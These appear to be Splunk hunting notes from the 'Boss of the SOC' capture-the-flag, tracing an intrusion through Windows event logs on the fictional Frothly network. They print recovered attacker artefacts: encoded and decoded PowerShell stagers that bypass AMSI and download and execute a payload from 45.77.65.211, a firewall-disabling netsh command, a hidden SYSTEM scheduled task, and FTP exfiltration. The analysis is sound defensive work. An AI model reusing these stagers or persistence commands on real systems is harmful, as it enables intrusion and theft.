## index="botsv*" sourcetype=WinEventLog
```
index="botsv*" sourcetype=WinEventLog | stats count by ComputerName
```
| ComputerName | Count |
| :--- | :--- |
| ABUNGST-L.froth.ly | 2791 |
| BGIST-L.froth.ly | 3340 |
| BSTOLL-L.froth.ly | 24427 |
| BTUN-L.froth.ly | 3968 |
| FYODOR-L.froth.ly | 2543 |
| JWORTOS-L.froth.ly | 2439 |
| MKRAEUS-L.froth.ly | 4174 |
| PCERF-L.froth.ly | 4280 |
| SEPM1 | 39 |
| WRK-ATURING | 1 |
| mercury.frothly.local | 1589019 |
| venus.frothly.local | 69194 |
| wrk-abungst.frothly.local | 78292 |
| wrk-aturing.frothly.local | 84998 |
| wrk-bgist.frothly.local | 65183 |
| wrk-btun.frothly.local | 81480 |
| wrk-fmaltes.frothly.local | 83539 |
| wrk-ghoppy.frothly.local | 72786 |
| wrk-klagerf.frothly.local | 58385 |

```
index="botsv*" sourcetype=WinEventLog EventCode=4624 | stats count by src_nt_host,src_ip
```
| src_nt_host | src_ip | count |
| :--- | :--- | :--- |
| BSTOLL-L | 127.0.0.1 | 2 |
| GROWLER | 10.0.1.133 | 5470 |
| MACLORY-AIR13S | 10.0.4.4 | 1 |
| MERCURY | 10.0.1.222 | 1029 |
| MERCURY | 10.0.4.1 | 2 |
| MERCURY | 127.0.0.1 | 1 |
| STARRAIDERS | 172.16.0.1 | 1 |
| VENUS | 10.0.1.101 | 1 |
| VENUS | 127.0.0.1 | 1 |
| VENUS | 71.39.18.121 | 1 |
| WRK-ATURING | 10.0.2.101 | 1 |
| WRK-ATURING | 127.0.0.1 | 436 |
| WRK-BTUN | 10.0.2.107 | 515 |
| WRK-FMALTES | 10.0.2.105 | 434 |
| WRK-GHOPPY | 10.0.2.103 | 465 |
| WRK-GHOPPY | 127.0.0.1 | 341 |
| WRK-KLAGERF | 10.0.2.109 | 1131 |

```
index="botsv*" sourcetype=WinEventLog EventCode=4624
| eval dest_host = upper(dvc_nt_host)
| stats count by src_nt_host,dest_host
| eval from=src_nt_host,to=dest_host,type="desktop"
```

### index="botsv*" sourcetype=WinEventLog | stats count by source

### index="botsv*" sourcetype=WinEventLog | stats count by SourceName







## index="botsv*" "frothly\\\billy.tun"
### index="botsv*" user="frothly\\billy.tun" 45.77.65.211 | stats count by src_ip,dest_ip
| src_ip     | dest_ip     | count |
| - | - | - |
| 10.0.2.107 | 45.77.65.211 | 12487 |

### index="botsv*" "frothly\\\billy.tun" process_name="netsh.exe"
```sh
08/23/2017 08:33:29 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=wrk-btun.frothly.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=57321
Keywords=Audit Success
Message=A new process has been created.

Subject:
	Security ID:		FROTHLY\billy.tun
	Account Name:		billy.tun
	Account Domain:		FROTHLY
	Logon ID:		0x25276

Process Information:
	New Process ID:		0x1168
	New Process Name:	C:\Windows\System32\netsh.exe
	Token Elevation Type:	TokenElevationTypeFull (2)
	Creator Process ID:	0xe80
	Process Command Line:	"C:\Windows\system32\netsh.exe"  advfirewall set allprofiles state off

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
```




## index="botsv*" "10.0.2.107"
### index="botsv*" "10.0.2.107" | stats count by src_ip,dest_ip

### index="botsv*" 10.0.2.107 EventCode=4624 | stats count by Workstation_Name
| Workstation_Name | count |
| - | - |
| WRK-BTUN         | 515   |

### index="botsv*" WRK-BTUN AND EventCode IN (4648,4688) AND powershell AND -enc | stats count by Creator_Process_ID
| Creator_Process_ID | count |
| - | - |
| 0x1174             | 1     |
| 0x8c0              | 1     |
| 0xed8              | 1     |

### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND parent_process_id IN (0xe80,0x1370) | stats count by _time,parent_process_id,process_id,process_command_line_process,process_command_line_arguments
| _time       | parent_process_id | process_id | process_command_line_process | process_command_line_arguments | count |
| - | - | - | - | - | - |
| 2017/08/24 12:31:59 | 0x1370 | 0x5e8 | "C:\Windows\system32\whoami.exe" | /groups | 1 |
| 2017/08/24 12:32:00 | 0x1370 | 0x112c | "C:\Windows\system32\whoami.exe" | /groups | 1 |
| 2017/08/24 12:33:29 | 0xe80 | 0x1168 | "C:\Windows\system32\netsh.exe"  | advfirewall set allprofiles state off | 1 |
| 2017/08/24 12:36:49 | 0xe80 | 0x11bc | "C:\Windows\system32\ftp.exe" | -i -s:winsys32.dll | 1|
| 2017/08/24 12:39:09 | 0xe80  | 0x123c | "C:\Windows\system32\whoami.exe" | /user | 1 |
| 2017/08/24 12:45:03 | 0xe80  | 0xd20 | "C:\Windows\system32\schtasks.exe" | /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
| 2017/08/24 12:46:35 | 0xe80 | 0x1108 | "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe" | /noconfig /fullpaths @"C:\Users\billy.tun\AppData\Local\Temp\_lvk8kdj.cmdline" | 1 |
| 2017/08/24 12:52:13 | 0xe80 | 0x850 | "C:\Windows\system32\net.exe" | share | 1 |
| 2017/08/26 14:42:06 | 0xe80 | 0x160c | "C:\Windows\system32\ftp.exe" | -i -s:winsys64.dll | 1 |
| 2017/08/26 15:13:34 | 0xe80 | 0xeac | "C:\Windows\system32\ftp.exe" | -i -s:winsys64.dll | 1 |
| 2017/08/26 15:43:37 | 0xe80 | 0xe08 | "C:\Windows\system32\ftp.exe" | open hildegardsfarm.com | 1 |
| 2017/08/26 15:46:08 | 0xe80 | 0x148c | "C:\Windows\system32\ftp.exe" | -i -s:singlefile.dll | 1 |

### index="botsv*" WRK-BTUN AND EventCode IN (4648,4688) AND parent_process_id IN (0xed8, 0x8c0, 0x1174) | stats count by _time,parent_process_id,process_id,process_command_line_process,process_command_line_arguments
| _time | parent_process_id | process_id | process_command_line_process | process_command_line_arguments  | count |
| - | - | - | - | - | - |
| 2017/08/24 12:29:08 | 0x8c0 | 0x1370 | powershell | -noP -sta -w 1 -enc WwBSAEUARgBdAC4AQQBTAFMARQBtAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUAZQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAFQARQBNAC4ATgBlAHQALgBTAGUAcgBWAEkAYwBFAFAATwBpAG4AVABNAEEAbgBBAEcARQByAF0AOgA6AEUAWABQAEUAYwBUADEAMAAwAEMATwBOAHQAaQBuAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQB3AC0ATwBCAGoARQBDAFQAIABTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBjAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAE8AWAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4ARQB0AC4AVwBFAEIAUgBlAHEAdQBlAFMAVABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBiAFAAcgBPAHgAeQA7ACQAVwBDAC4AUABSAG8AeAB5AC4AQwBSAEUARABlAE4AdABJAEEAbABzACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAUgBlAGQARQBOAHQAaQBBAGwAQwBBAEMAaABFAF0AOgA6AEQAZQBGAEEAdQBsAFQATgBFAFQAVwBvAFIAawBDAHIAZQBEAEUATgBUAEkAYQBsAFMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABFAHgAdAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAVABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAFcAQwAuAEgAZQBhAEQAZQBSAFMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGoAawBuAFgAcABvAGEANwBwAFUAQQAwAGwARABCACsAbgBZAGkAUQB2AFUAOQB1AG4ASABnAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABvAFcAbgBMAG8AQQBkAEQAYQBUAGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQARABhAFQAQQBbADQALgAuACQAZABhAFQAYQAuAEwAZQBOAEcAdABIAF0AOwAtAGoAbwBpAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA  | 1  |
| 2017/08/24 12:32:00 | 0xed8 | 0x1174 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x | 1 |
| 2017/08/24 12:32:01 | 0x1174 | 0xe80 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | -NoP -NonI -W Hidden -enc WwBSAGUAZgBdAC4AQQBzAFMARQBtAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUARQAoACQAbgBVAEwAbAAsACQAVABSAHUARQApAH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAHQALgBTAEUAUgB2AEkAQwBFAFAATwBJAG4AVABNAEEAbgBhAGcARQBSAF0AOgA6AEUAWABQAEUAYwB0ADEAMAAwAEMAbwBuAHQAaQBOAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBiAGoARQBDAHQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBFAGIAQwBsAGkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAdwBjAC4ASABlAEEAZABlAFIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeAB5AD0AWwBTAHkAUwBUAEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBFAFEAVQBlAFMAdABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBvAHgAWQA7ACQAVwBjAC4AUABSAE8AeAB5AC4AQwBSAGUARABlAE4AdABJAGEAbABTACAAPQAgAFsAUwB5AHMAdABlAE0ALgBOAEUAdAAuAEMAcgBFAGQARQBuAHQAaQBhAEwAQwBhAGCASABlAF0AOgA6AEQAZQBGAEEAdQBMAHQATgBlAHQAVwBPAFIAawBDAFIARQBEAGUATgB0AEkAQQBsAHMAOwAkAEsAPQBbAFMAeQBzAHQARQBtAC4AVABlAHgAdAAuAEUAbgBjAE8ARABJAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAHkAVABlAFMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAHgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGwAcgB0AFIASABLAGsAQQA2AEkATAA1AGgALwBkADgARQBrAGsANgBRAHMAeAB5AFAAdgBrAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBhAGQAbQBpAG4ALwBnAGUAdAAuAHAAaABwACcAOwAkAEQAQQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4ATABvAGEARABEAEEAVABBACgAJABTAEUAUgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQBUAGEALgBsAEUATgBHAFQAaABdADsALQBKAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== | 1 |

```powerhshell
[Ref].AsSEmbLY.GetTYPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLd('amsiInitFailed','NonPublic,Static').SEtVaLUE($nULl,$TRuE)};[SYstem.NEt.SERvICEPOInTMAnagER]::EXPEct100ContiNue=0;$wC=NEW-ObjECt SYsTeM.NeT.WEbCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeAdeRS.AdD('User-Agent',$u);$WC.Proxy=[SySTEm.Net.WeBREQUeSt]::DEfAulTWeBProxY;$Wc.PROxy.CReDeNtIalS = [SysteM.NEt.CrEdEntiaLCa`He]::DeFAuLtNetWORkCREDeNtIAls;$K=[SystEm.Text.EncODIng]::ASCII.GeTByTeS('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeadERs.ADd("Cookie","session=lrtRHKkA6IL5h/d8Ekk6QsxyPvk=");$ser='https://45.77.65.211:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATA($SER+$T);$iV=$DAta[0..3];$DatA=$dATa[4..$DaTa.lENGTh];-JoIN[CHar[]](& $R $daTa ($IV+$K))|IEX
```
```powershell
[REF].ASSEmblY.GeTTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFIELd('amsiInitFailed','NonPublic,Static').SetVaLue($nuLl,$TruE)};[SYsTEM.Net.SerVIcEPOinTMAnAGEr]::EXPEcT100CONtinue=0;$wC=NEw-OBjECT SysTem.NEt.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADers.Add('User-Agent',$u);$Wc.PROXy=[System.NEt.WEBRequeST]::DefAUltWebPrOxy;$WC.PRoxy.CREDeNtIAls = [SySteM.NET.CRedENtiAlCAChE]::DeFAulTNETWoRkCreDENTIalS;$K=[SysTem.TExt.ENcOdiNG]::ASCII.GetBYTes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}};$WC.HeaDeRS.Add("Cookie","session=jknXpoa7pUA0lDB+nYiQvU9unHg=");$ser='https://45.77.65.211:443';$t='/login/process.php';$DATA=$WC.DoWnLoAdDaTa($SEr+$t);$IV=$DATa[0..3];$dATa=$DaTA[4..$daTa.LeNGtH];-joiN[CHar[]](& $R $data ($IV+$K))|IEX
```

### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND process_id IN (0xed8, 0x8c0, 0x1174) | stats count by parent_process_id
こいつら親プロセスはシステム系のプロセスぽいので、攻撃者のプロセスはないかんじ？
| parent_process_id | count |
|-------------------|-------|
| 0x1370            | 1     |
| 0x1d0             | 5     |
| 0x2ac             | 3     |
| 0x68c             | 2     |
| 0x6ac             | 1     |
| 0xe50             | 35    |
| 0xed8             | 1     |





## maniputalin eventlog
### index="botsv*" EventCode=104 SourceName=Microsoft-Windows-Eventlog | stats count by ComputerName,Message
1個ホストに100件以上あったので省略
| ComputerName                  | Message                                                                      | count |
|------------------------------|-------------------------------------------------------------------------------|-------|
| wrk-klagerf.frothly.local    | The Application log file was cleared.                                        | 1     |
| wrk-klagerf.frothly.local    | The ForwardedEvents log file was cleared.                                    | 1     |
| wrk-klagerf.frothly.local    | The HardwareEvents log file was cleared.                                     | 1     |
| wrk-klagerf.frothly.local    | The Internet Explorer log file was cleared.                                  | 1     |
| wrk-klagerf.frothly.local    | The Key Management Service log file was cleared.                             | 1     |
| wrk-klagerf.frothly.local    | The Media Center log file was cleared.                                       | 1     |
| wrk-klagerf.frothly.local    | The Microsoft-Windows-API-Tracing/Operational log file was cleared.          | 1     |
| wrk-klagerf.frothly.local    | The Microsoft-Windows-AppID/Operational log file was cleared.                | 1     |
| wrk-klagerf.frothly.local    | The Microsoft-Windows-AppLocker/EXE and DLL log file was cleared.            | 1     |
| wrk-klagerf.frothly.local    | The Microsoft-Windows-AppLocker/MSI and Script log file was cleared.         | 1     |

### index="botsv*" EventCode=1100 SourceName=Microsoft-Windows-Eventlog | stats count by ComputerName,Message
| _time              | ComputerName               | Message                                   | count |
|--------------------|----------------------------|--------------------------------------------|-------|
| 2017/08/28 08:23:54 | wrk-aturing.frothly.local | The event logging service has shut down.  | 1     |
| 2018/08/20 18:11:24 | PCERF-L.froth.ly          | The event logging service has shut down.  | 1     |
| 2018/08/20 22:34:02 | BSTOLL-L.froth.ly         | The event logging service has shut down.  | 1     |

### index="botsv*" EventCode=6006 SourceName=EventLog | stats count by _time,ComputerName,Message
| _time              | ComputerName                | Message                               | count |
|--------------------|-----------------------------|----------------------------------------|--------|
| 2017/08/28 08:23:55 | wrk-aturing.frothly.local   | The Event log service was stopped.    | 1      |
| 2018/08/20 18:11:24 | PCERF-L.froth.ly            | The Event log service was stopped.    | 1      |
| 2018/08/20 22:34:02 | BSTOLL-L.froth.ly           | The Event log service was stopped.    | 1      |

### index="botsv*" EventCode=7036 SourceName="Microsoft-Windows-Service Control Manager" service="Windows Event Log" status=stopped | stats count by _time,ComputerName,Message
| _time              | ComputerName               | Message                                                   | count |
|--------------------|----------------------------|------------------------------------------------------------|-------|
| 2017/08/28 08:23:55 | wrk-aturing.frothly.local | The Windows Event Log service entered the stopped state.  | 1     |

### index="botsv*" EventCode=1102 SourceName=Microsoft-Windows-Eventlog
```
08/25/2017 10:30:27 PM
LogName=Security
SourceName=Microsoft-Windows-Eventlog
EventCode=1102
EventType=4
Type=Information
ComputerName=wrk-klagerf.frothly.local
TaskCategory=Log clear
OpCode=Info
RecordNumber=64808
Keywords=Audit Success
Message=The audit log was cleared.
Subject:
	Security ID:	FROTHLY\service3
	Account Name:	service3
	Domain Name:	FROTHLY
	Logon ID:	0xf9b47f
```





## a
### index="botsv*" "*schtasks.exe" "*/Create *" | stats count by Security_ID,ComputerName,Process_Command_Line
| Security_ID | ComputerName | Process_Command_Line | count |
| :--- | :--- | :--- | :--- |
| NT AUTHORITY\SYSTEM | wrk-ghoppy.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 900 |
| NT AUTHORITY\SYSTEM | wrk-btun.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 869 |
| NT AUTHORITY\SYSTEM | wrk-ghoppy.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office ClickToRun Service Monitor" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml" | 466 |
| NT AUTHORITY\SYSTEM | wrk-bgist.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 435 |
| NT AUTHORITY\SYSTEM | wrk-abungst.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 403 |
| NT AUTHORITY\SYSTEM | wrk-fmaltes.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 403 |
| NT AUTHORITY\SYSTEM | wrk-aturing.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office Automatic Updates" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeUpdateSchedule.xml" | 344 |
| NT AUTHORITY\SYSTEM | wrk-aturing.frothly.local | schtasks.exe /Create /tn "Microsoft\Office\Office ClickToRun Service Monitor" /XML "C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ServiceWatcherSchedule.xml" | 3 |
| AzureAD\FyodorMalteskesko | FYODOR-L.froth.ly | "C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
| FROTHLY\billy.tun | wrk-btun.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
| FROTHLY\service3 | venus.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
| FROTHLY\service3 | wrk-klagerf.frothly.local | "C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
| NULL SID | FYODOR-L.froth.ly | "C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |

### index="botsv*" "wmiprvse*" | stats count by Security_ID
| Security_ID | count |
| :--- | :--- |
| NT AUTHORITY\SYSTEM | 2685 |
| NT AUTHORITY\NETWORK SERVICE | 405 |
| NULL SID | 14 |
| AzureAD\FyodorMalteskesko | 4 |

### 
index="botsv*" EventCode=4624 Logon_Type=3 ComputerName IN ("*klagerf*", "*btun*" , "*FYODOR-L*" , "*venus*")
| rename ComputerName as dest_host
| rename src_nt_host as src_host
| stats count by src_host,dest_host
| eval from=src_host, to=dest_host
| fields from, to, count




## service3
### index="botsv*" EventCode=4672 | top limit=100 Security_ID
| Security_ID                     | count  | percent   |
|----------------------------------|--------|-----------|
| FROTHLY\service3                | 336393 | 91.069877 |
| NT AUTHORITY\SYSTEM            | 16235  | 4.395215  |
| FROTHLY\grace.hoppy            | 9163   | 2.480650  |
| FROTHLY\administrator          | 7166   | 1.940013  |
| FROTHLY\kevin.lagerfield       | 398    | 0.107748  |
| Window Manager\DWM-1           | 4      | 0.001083  |
| Window Manager\DWM-2           | 3      | 0.000812  |
| NT AUTHORITY\NETWORK SERVICE   | 3      | 0.000812  |
| NT AUTHORITY\LOCAL SERVICE     | 3      | 0.000812  |
| FROTHLY\Administrator          | 3      | 0.000812  |
| FROTHLY\mallory.kraeusen       | 2      | 0.000541  |
| AzureAD\BudStoll               | 2      | 0.000541  |
| S-1-5-18                       | 1      | 0.000271  |
| IIS APPPOOL\DefaultAppPool     | 1      | 0.000271  |
| FROTHLY\amber.turing           | 1      | 0.000271  |
| FROTHLY\MERCURY$               | 1      | 0.000271  |


